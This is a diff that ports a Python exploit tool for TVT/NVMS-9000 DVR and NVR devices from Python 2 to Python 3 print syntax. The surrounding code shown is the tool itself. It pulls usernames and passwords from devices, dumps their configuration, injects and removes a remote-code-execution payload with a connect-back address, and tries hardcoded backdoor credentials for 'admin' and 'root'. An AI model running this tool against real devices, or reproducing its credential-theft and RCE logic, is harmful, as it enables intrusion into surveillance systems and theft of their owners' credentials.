@@ -14,6 +14,7 @@
 # OEM Vendors (+80): https://ipvm.com/forums/video-surveillance/topics/a-list-of-tvt-s-79-dvr-oems (Not complete list)
 #
 #
+from __future__ import print_function
 import socket
 import select
 import sys
@@ -51,17 +52,17 @@ class HTTPconnect:
 		url = '{}://{}{}'.format(self.proto, self.host, self.uri)
 
 		if self.verbose:
-			print "[Verbose] Sending:", url
+			print("[Verbose] Sending:", url)
 
 		if self.proto == 'https':
 			if hasattr(ssl, '_create_unverified_context'):
-				print "[i] Creating SSL Unverified Context"
+				print("[i] Creating SSL Unverified Context")
 				ssl._create_default_https_context = ssl._create_unverified_context
 
 		if self.credentials:
 			Basic_Auth = self.credentials.split(':')
 			if self.verbose:
-				print "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]
+				print("[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1])
 			try:
 				pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
 				pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
@@ -69,11 +70,11 @@ class HTTPconnect:
 				opener = urllib2.build_opener(auth_handler)
 				urllib2.install_opener(opener)
 			except Exception as e:
-				print "[!] Basic Auth Error:",e
+				print("[!] Basic Auth Error:",e)
 				sys.exit(1)
 
 		if self.noexploit and not self.verbose:
-			print "[<] 204 Not Sending!"
+			print("[<] 204 Not Sending!")
 			html =  "Not sending any data"
 			return html
 		else:
@@ -85,9 +86,9 @@ class HTTPconnect:
 				rsp = urllib2.urlopen(req)
 			except Exception as e:
 				if not hasattr (e,'reason'):
-					print "[<] Request is most likely being blocked ({})".format(str(e))
+					print("[<] Request is most likely being blocked ({})".format(str(e)))
 				else:
-					print "[<] Payload response failed: {}".format(str(e))
+					print("[<] Payload response failed: {}".format(str(e)))
 				return False
 
 		if self.Raw:
@@ -178,9 +179,9 @@ class TVT:
 			if self.rport == '4567':
 				TVT_bin = base64.b64decode(response[12]) # Base64 'SystemConfig'
 				XML_2_JSON = self.GetXML_2_JSON(TVT_bin)
-				print "[i] Dumping Config"
+				print("[i] Dumping Config")
 				for what in XML_2_JSON.keys():
-					print json.dumps(XML_2_JSON[what],indent=4)
+					print(json.dumps(XML_2_JSON[what],indent=4))
 			else:
 				if (self.GetDeviceInfo_HTTP(lhost, lport,True)): # Light version of 'SystemConfig'
 					return True
@@ -200,7 +201,7 @@ class TVT:
 
 		elif self.cmd == 'doLogin':
 			if self.rport == '4567':
-				print "[!] Login do not work here, no need for it..."
+				print("[!] Login do not work here, no need for it...")
 				return True
 			else:
 				if (self.doLogin_HTTP(lhost, lport)):
@@ -219,7 +220,7 @@ class TVT:
 					file = open(rhost + '_QR.png','wb')
 					file.write(QR_img)
 					file.close()
-					print "[i] QR Image saved: {}".format(rhost + '_QR.png')
+					print("[i] QR Image saved: {}".format(rhost + '_QR.png'))
 			else:
 
 				if (self.queryQRInfo_HTTP(self.lhost, self.lport)):
@@ -232,7 +233,7 @@ class TVT:
 				TVT_bin = base64.b64decode(response[12]) # Base64 'SystemConfig'
 				XML_2_JSON = self.GetXML_2_JSON(TVT_bin)
 				username, password = self.GetLoginPassword(TVT_bin, XML_2_JSON)
-				print "[i] Username: {}, Password: {}".format(username,password)
+				print("[i] Username: {}, Password: {}".format(username,password))
 			else:
 				if (self.queryUserList_HTTP(self.lhost, self.lport)):
 					return True
@@ -250,7 +251,7 @@ class TVT:
 
 		if self.rport == '4567':
 			self.sock.close()
-			print "[i] Disconnected"
+			print("[i] Disconnected")
 
 #
 # Stuff for HTTP/HTTPS Access
@@ -280,7 +281,7 @@ class TVT:
 		file = open(rhost + '_QR.png','wb')
 		file.write(response)
 		file.close()
-		print "[i] QR Image saved: {}".format(rhost + '_QR.png')
+		print("[i] QR Image saved: {}".format(rhost + '_QR.png'))
 		return True
 
 	def doLogin_HTTP(self, lhost, lport):
@@ -302,31 +303,31 @@ class TVT:
 		MSG = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'
 
 		URI = '/doLogin'
-		print "[>] Query for username(s)/password(s)"
+		print("[>] Query for username(s)/password(s)")
 		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,MSG,None)
 		if not response:
 			return False
 		self.XML_2_JSON = xmltodict.parse(response)
 		if self.XML_2_JSON['response']['status'] == 'success':
-			print "[<] 200 OK"
+			print("[<] 200 OK")
 #			print json.dumps(self.XML_2_JSON['response'],indent=4)
 			for who in self.XML_2_JSON['response']['content']:
 				if who == 'userId': 
-					print "[<] User ID: {}".format(self.XML_2_JSON['response']['content']['userId'])
+					print("[<] User ID: {}".format(self.XML_2_JSON['response']['content']['userId']))
 				elif who == 'adminName': 
-					print "[<] Admin Name: {}".format(self.XML_2_JSON['response']['content']['adminName'])
+					print("[<] Admin Name: {}".format(self.XML_2_JSON['response']['content']['adminName']))
 				elif who == 'sessionId': 
-					print "[<] Session ID: {}".format(self.XML_2_JSON['response']['content']['sessionId'])
+					print("[<] Session ID: {}".format(self.XML_2_JSON['response']['content']['sessionId']))
 				elif who == 'resetPassword': 
-					print "[<] Reset Password: {}".format(base64.b64decode(self.XML_2_JSON['response']['content']['resetPassword']))
+					print("[<] Reset Password: {}".format(base64.b64decode(self.XML_2_JSON['response']['content']['resetPassword'])))
 			return True
 		else:
 			if self.XML_2_JSON['response']['errorCode'] == '536870948':
-				print "[<] Wrong Password!"
+				print("[<] Wrong Password!")
 			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
-				print "[<] Wrong Username!"
+				print("[<] Wrong Username!")
 			else:
-				print json.dumps(self.XML_2_JSON['response'],indent=4)
+				print(json.dumps(self.XML_2_JSON['response'],indent=4))
 			return False
 
 	def queryUserList_HTTP(self, lhost, lport):
@@ -348,31 +349,31 @@ class TVT:
 		MSG = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'
 
 		URI = '/queryUserList'
-		print "[>] Query for username(s)/password(s)"
+		print("[>] Query for username(s)/password(s)")
 		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,MSG,None)
 		if not response:
 			return False
 		self.XML_2_JSON = xmltodict.parse(response)
 		if self.XML_2_JSON['response']['status'] == 'success':
-			print "[<] 200 OK"
+			print("[<] 200 OK")
 #			print json.dumps(self.XML_2_JSON['response'],indent=4)
 			# One User only
 			for who in self.XML_2_JSON['response']['content']['item']:
 				if who == 'userName': 
-					print "[<] Username: {}, Password: {}".format(self.XML_2_JSON['response']['content']['item']['userName'], self.XML_2_JSON['response']['content']['item']['password'])
+					print("[<] Username: {}, Password: {}".format(self.XML_2_JSON['response']['content']['item']['userName'], self.XML_2_JSON['response']['content']['item']['password']))
 					return True
 			# Several Users
 			for who in range(0, len(self.XML_2_JSON['response']['content']['item'])):
 				if (self.XML_2_JSON['response']['content']['item'][who]['enabled'] == 'true'):
-					print "[<] Username: {}, Password: {}".format(self.XML_2_JSON['response']['content']['item'][who]['userName'], self.XML_2_JSON['response']['content']['item'][who]['password'])
+					print("[<] Username: {}, Password: {}".format(self.XML_2_JSON['response']['content']['item'][who]['userName'], self.XML_2_JSON['response']['content']['item'][who]['password']))
 			return True
 		else:
 			if self.XML_2_JSON['response']['errorCode'] == '536870948':
-				print "[<] Wrong Password!"
+				print("[<] Wrong Password!")
 			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
-				print "[<] Wrong Username!"
+				print("[<] Wrong Username!")
 			else:
-				print json.dumps(self.XML_2_JSON['response'],indent=4)
+				print(json.dumps(self.XML_2_JSON['response'],indent=4))
 			return False
 
 	def GetDeviceInfo_HTTP(self, lhost, lport, dump):
@@ -395,48 +396,48 @@ class TVT:
 		MSG = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'
 
 		URI = '/queryBasicCfg'
-		print "[>] Get info about remote target"
+		print("[>] Get info about remote target")
 		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,MSG,None)
 		if not response:
 			return False
 		self.XML_2_JSON = xmltodict.parse(response)
 		if self.XML_2_JSON['response']['status'] == 'success':
-			print "[<] 200 OK"
+			print("[<] 200 OK")
 			if self.dump:
-				print json.dumps(self.XML_2_JSON,indent=4)
+				print(json.dumps(self.XML_2_JSON,indent=4))
 				return True
 		else:
 			if self.XML_2_JSON['response']['errorCode'] == '536870948':
-				print "[<] Wrong Password!"
+				print("[<] Wrong Password!")
 			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
-				print "[<] Wrong Username!"
+				print("[<] Wrong Username!")
 			else:
-				print json.dumps(self.XML_2_JSON['response'],indent=4)
+				print(json.dumps(self.XML_2_JSON['response'],indent=4))
 			return False
 
 		for tmp2 in self.XML_2_JSON['response'].keys():
 			if tmp2 == 'content':
 				for tmp3 in self.XML_2_JSON['response'][tmp2].keys():
 					if tmp3 == 'softwareVersion':
-						print "[i] Firmware Version: {}".format(self.XML_2_JSON['response'][tmp2]['softwareVersion'])
+						print("[i] Firmware Version: {}".format(self.XML_2_JSON['response'][tmp2]['softwareVersion']))
 					elif tmp3 == 'kenerlVersion':
-						print "[i] Kernel Version: {}".format(self.XML_2_JSON['response'][tmp2]['kenerlVersion'])
+						print("[i] Kernel Version: {}".format(self.XML_2_JSON['response'][tmp2]['kenerlVersion']))
 					elif tmp3 == 'launchDate':
-						print "[i] Software Date: {}".format(self.XML_2_JSON['response'][tmp2]['launchDate'])
+						print("[i] Software Date: {}".format(self.XML_2_JSON['response'][tmp2]['launchDate']))
 					elif tmp3 == 'hardwareVersion':
-						print "[i] Hardware Version: {}".format(self.XML_2_JSON['response'][tmp2]['hardwareVersion'])
+						print("[i] Hardware Version: {}".format(self.XML_2_JSON['response'][tmp2]['hardwareVersion']))
 					elif tmp3 == 'customerId':
-						print "[i] Customer/OEM ID: {}".format(self.XML_2_JSON['response'][tmp2]['customerId'])
+						print("[i] Customer/OEM ID: {}".format(self.XML_2_JSON['response'][tmp2]['customerId']))
 					elif tmp3 == 'manufacturer':
-						print "[i] Manufacture/OEM: {}".format(self.XML_2_JSON['response'][tmp2]['manufacturer']['item'][0]['@translateKey'])
+						print("[i] Manufacture/OEM: {}".format(self.XML_2_JSON['response'][tmp2]['manufacturer']['item'][0]['@translateKey']))
 					elif tmp3 == 'sn':
-						print "[i] Serial Number: {}".format(self.XML_2_JSON['response'][tmp2]['sn'])
+						print("[i] Serial Number: {}".format(self.XML_2_JSON['response'][tmp2]['sn']))
 					elif tmp3 == 'productModel':
-						print "[i] Device Model: {}".format(self.XML_2_JSON['response'][tmp2]['productModel'])
+						print("[i] Device Model: {}".format(self.XML_2_JSON['response'][tmp2]['productModel']))
 					elif tmp3 == 'name':
-						print "[i] Device Name: {}".format(self.XML_2_JSON['response'][tmp2]['name'])
+						print("[i] Device Name: {}".format(self.XML_2_JSON['response'][tmp2]['name']))
 					elif tmp3 == 'defaultUser':
-						print "[i] Default User: {}".format(self.XML_2_JSON['response'][tmp2]['defaultUser']['item']['#text'])
+						print("[i] Default User: {}".format(self.XML_2_JSON['response'][tmp2]['defaultUser']['item']['#text']))
 		return True
 
 	def RCE_HTTP(self, lhost, lport):
@@ -500,39 +501,39 @@ class TVT:
 		#
 		# Enable RCE and execute
 		#
-		print "[>] Adding and executing RCE"
+		print("[>] Adding and executing RCE")
 		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,ADD_RCE,None)
 		if not response:
 			return False
 		XML_2_JSON = xmltodict.parse(response)
 		if XML_2_JSON['response']['status'] == 'success':
-			print "[<] 200 OK"
+			print("[<] 200 OK")
 		elif XML_2_JSON['response']['status'] == 'fail':
 			if self.XML_2_JSON['response']['errorCode'] == '536870948':
-				print "[<] Wrong Password!"
+				print("[<] Wrong Password!")
 			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
-				print "[<] Wrong Username!"
+				print("[<] Wrong Username!")
 			else:
-				print json.dumps(self.XML_2_JSON['response'],indent=4)
+				print(json.dumps(self.XML_2_JSON['response'],indent=4))
 			return False
 
 		#
 		# Delete RCE
 		#
-		print "[>] Removing RCE"
+		print("[>] Removing RCE")
 		response = HTTPconnect(self.remote_host,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,headers,DEL_RCE,None)
 		if not response:
 			return False
 		XML_2_JSON = xmltodict.parse(response)
 		if XML_2_JSON['response']['status'] == 'success':
-			print "[<] 200 OK"
+			print("[<] 200 OK")
 		elif XML_2_JSON['response']['status'] == 'fail':
 			if self.XML_2_JSON['response']['errorCode'] == '536870948':
-				print "[<] Wrong Password!"
+				print("[<] Wrong Password!")
 			elif self.XML_2_JSON['response']['errorCode'] == '536870947':
-				print "[<] Wrong Username!"
+				print("[<] Wrong Username!")
 			else:
-				print json.dumps(self.XML_2_JSON['response'],indent=4)
+				print(json.dumps(self.XML_2_JSON['response'],indent=4))
 			return False
 
 		return True
@@ -606,25 +607,25 @@ class TVT:
 						if tmp2 == 'content':
 							for tmp3 in self.XML_2_JSON[what]['response'][tmp2].keys():
 								if tmp3 == 'softwareVersion':
-									print "[i] Firmware Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['softwareVersion'])
+									print("[i] Firmware Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['softwareVersion']))
 								elif tmp3 == 'kenerlVersion':
-									print "[i] Kernel Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['kenerlVersion'])
+									print("[i] Kernel Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['kenerlVersion']))
 								elif tmp3 == 'launchDate':
-									print "[i] Software Date: {}".format(self.XML_2_JSON[what]['response'][tmp2]['launchDate'])
+									print("[i] Software Date: {}".format(self.XML_2_JSON[what]['response'][tmp2]['launchDate']))
 								elif tmp3 == 'hardwareVersion':
-									print "[i] Hardware Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['hardwareVersion'])
+									print("[i] Hardware Version: {}".format(self.XML_2_JSON[what]['response'][tmp2]['hardwareVersion']))
 								elif tmp3 == 'customerId':
-									print "[i] Customer/OEM ID: {}".format(self.XML_2_JSON[what]['response'][tmp2]['customerId'])
+									print("[i] Customer/OEM ID: {}".format(self.XML_2_JSON[what]['response'][tmp2]['customerId']))
 								elif tmp3 == 'manufacturer':
-									print "[i] Manufacture/OEM: {}".format(self.XML_2_JSON[what]['response'][tmp2]['manufacturer']['item'][0]['@translateKey'])
+									print("[i] Manufacture/OEM: {}".format(self.XML_2_JSON[what]['response'][tmp2]['manufacturer']['item'][0]['@translateKey']))
 								elif tmp3 == 'sn':
-									print "[i] Serial Number: {}".format(self.XML_2_JSON[what]['response'][tmp2]['sn'])
+									print("[i] Serial Number: {}".format(self.XML_2_JSON[what]['response'][tmp2]['sn']))
 								elif tmp3 == 'productModel':
-									print "[i] Device Model: {}".format(self.XML_2_JSON[what]['response'][tmp2]['productModel'])
+									print("[i] Device Model: {}".format(self.XML_2_JSON[what]['response'][tmp2]['productModel']))
 								elif tmp3 == 'name':
-									print "[i] Device Name: {}".format(self.XML_2_JSON[what]['response'][tmp2]['name'])
+									print("[i] Device Name: {}".format(self.XML_2_JSON[what]['response'][tmp2]['name']))
 								elif tmp3 == 'defaultUser':
-									print "[i] Default User: {}".format(self.XML_2_JSON[what]['response'][tmp2]['defaultUser']['item']['#text'])
+									print("[i] Default User: {}".format(self.XML_2_JSON[what]['response'][tmp2]['defaultUser']['item']['#text']))
 
 	def RCE_4567(self, lhost, lport, sock):
 		self.lhost = lhost
@@ -685,11 +686,11 @@ class TVT:
 		ADD_MESSAGE = ADD_MESSAGE.replace("CONTENT_LENGTH",str(len(base64.b64encode(ADD_RCE))))
 		ADD_MESSAGE += base64.b64encode(ADD_RCE)
 
-		print "[i] Adding and executing RCE"
+		print("[i] Adding and executing RCE")
 		response = self.Send_4567(self.sock, ADD_MESSAGE)
 		tmp = response.split()
 		if tmp[1] != '200':
-			print "[!] Error".format(response)
+			print("[!] Error".format(response))
 			return False
 
 		#
@@ -702,10 +703,10 @@ class TVT:
 		DEL_MESSAGE = DEL_MESSAGE.replace("CONTENT_LENGTH",str(len(base64.b64encode(DEL_RCE))))
 		DEL_MESSAGE += base64.b64encode(DEL_RCE)
 
-		print "[i] Removing RCE"
+		print("[i] Removing RCE")
 		response = self.Send_4567(self.sock, DEL_MESSAGE)
 		if tmp[1] != '200':
-			print "[!] Error".format(response)
+			print("[!] Error".format(response))
 			return False
 
 	def Send_4567(self, sock, message):
@@ -713,15 +714,15 @@ class TVT:
 		self.message = message
 
 		try:
-			print "[>] Sending"
+			print("[>] Sending")
 			self.sock.send(self.message)
 			response = self.sock.recv(self.BUFFER_SIZE)
 		except Exception as e:
-			print "[!] Send failed ({})".format(e)
+			print("[!] Send failed ({})".format(e))
 			self.sock.close()
 			sys.exit(1)
 
-		print "[<] 200 OK"
+		print("[<] 200 OK")
 		return response
 
 	def Connect_4567(self):
@@ -734,27 +735,27 @@ class TVT:
 		try:
 			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			self.sock.connect((self.rhost, TVT_rport))
-			print "[i] Connected"
+			print("[i] Connected")
 		except Exception as e:
-			print "[!] Connection failed ({})".format(e)
+			print("[!] Connection failed ({})".format(e))
 			sys.exit(1)
 
 		try:
-			print "[>] Verifying access"
+			print("[>] Verifying access")
 			self.sock.send(MESSAGE)
 			response = self.sock.recv(self.BUFFER_SIZE)
 		except Exception as e:
-			print "[!] Sending failed ({})".format(e)
+			print("[!] Sending failed ({})".format(e))
 			self.sock.close()
 			sys.exit(1)
 
 
 		if response != MESSAGE:
-			print "[!] NO MATCH\n[!] Response: {}".format(response)
+			print("[!] NO MATCH\n[!] Response: {}".format(response))
 			self.sock.close()
 			sys.exit(0)
 		else:
-			print "[<] 200 OK"
+			print("[<] 200 OK")
 		return self.sock
 
 	def GetSystemConfig(self, sock, request):
@@ -794,7 +795,7 @@ class TVT:
 						break
 					buf += response
 			except Exception as e:
-				print "[!] Error ({})".format(e)
+				print("[!] Error ({})".format(e))
 				self.sock.close()
 				sys.exit(1)
 		return buf
@@ -851,10 +852,10 @@ if __name__ == "__main__":
 		arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
 		args = arg_parser.parse_args()
 	except Exception as e:
-		print INFO,"\nError: {}\n".format(str(e))
+		print(INFO,"\nError: {}\n".format(str(e)))
 		sys.exit(1)
 
-	print INFO
+	print(INFO)
 
 	request = ''
 	if args.getrce:
@@ -875,7 +876,7 @@ if __name__ == "__main__":
 		cmd = 'doLogin'
 		request = 'doLogin'
 	else:
-		print "[!] Choose something to do...\n[--getrce | --getdump | --getinfo | --getcreds | --getQR | --getlogin]"
+		print("[!] Choose something to do...\n[--getrce | --getdump | --getinfo | --getcreds | --getQR | --getlogin]")
 		sys.exit(1)
 
 	if args.https:
@@ -915,65 +916,65 @@ if __name__ == "__main__":
 				'User-Agent':'ApiTool'
 				}
 
-			print "[>] Trying to find out my external IP"
+			print("[>] Trying to find out my external IP")
 			lhost = HTTPconnect("whatismyip.akamai.com",proto,verbose,credentials,False,noexploit).Send("/",headers,None,None)
 			if verbose:
-				print "[Verbose] Detected my external IP:",lhost
+				print("[Verbose] Detected my external IP:",lhost)
 		except Exception as e:
-			print "[<] ",e
+			print("[<] ",e)
 			sys.exit(1)
 
 	# Check if RPORT is valid
 	if not Validate(verbose).Port(rport):
-		print "[!] Invalid RPORT - Choose between 1 and 65535"
+		print("[!] Invalid RPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if LPORT is valid
 	if not Validate(verbose).Port(lport):
-		print "[!] Invalid LPORT - Choose between 1 and 65535"
+		print("[!] Invalid LPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(verbose).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 	# Check if LHOST is valid IP or FQDN, get IP back
 	lhost = Validate(verbose).Host(lhost)
 	if not lhost:
-		print "[!] Invalid LHOST"
+		print("[!] Invalid LHOST")
 		sys.exit(1)
 
 #
 # Validation done, start print out stuff to the user
 #
 	if args.https:
-		print "[i] HTTPS / SSL Mode Selected"
-	print "[i] Remote target IP:",rhost
-	print "[i] Remote target PORT:",rport
+		print("[i] HTTPS / SSL Mode Selected")
+	print("[i] Remote target IP:",rhost)
+	print("[i] Remote target PORT:",rport)
 	if cmd == 'RCE':
-		print "[i] Connect back IP:",lhost
-		print "[i] Connect back PORT:",lport
+		print("[i] Connect back IP:",lhost)
+		print("[i] Connect back PORT:",lport)
 
 
 	#
 	# HTTP API with hardcoded authentication on TCP/4567 to NVMS9000 (bypass of ConfigSyncProc)
 	#
 	if args.rport == '4567':
-		print "[!] Be aware that remote HTTP/HTTPS access will not work until reboot!"
+		print("[!] Be aware that remote HTTP/HTTPS access will not work until reboot!")
 		TVT(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).APIConfigClient(lhost, lport, cmd, request)
 
 	#
 	# HTTP/HTTPS API with hardcoded password (ConfigSyncProc)
 	# admin:{12213BD1-69C7-4862-843D-260500D1DA40}
 	else:
-		print "[!] Trying w/ credentials: {}".format(credentials)
+		print("[!] Trying w/ credentials: {}".format(credentials))
 		if not(TVT(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).APIConfigClient(lhost, lport, cmd, request)):
 			credentials = 'root:{12213BD1-69C7-4862-843D-260500D1DA40}'
-			print "[!] Trying w/ credentials: {}".format(credentials)
+			print("[!] Trying w/ credentials: {}".format(credentials))
 			TVT(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).APIConfigClient(lhost, lport, cmd, request)
-	print "[i] All done"
+	print("[i] All done")
 
 
 # [EOF]
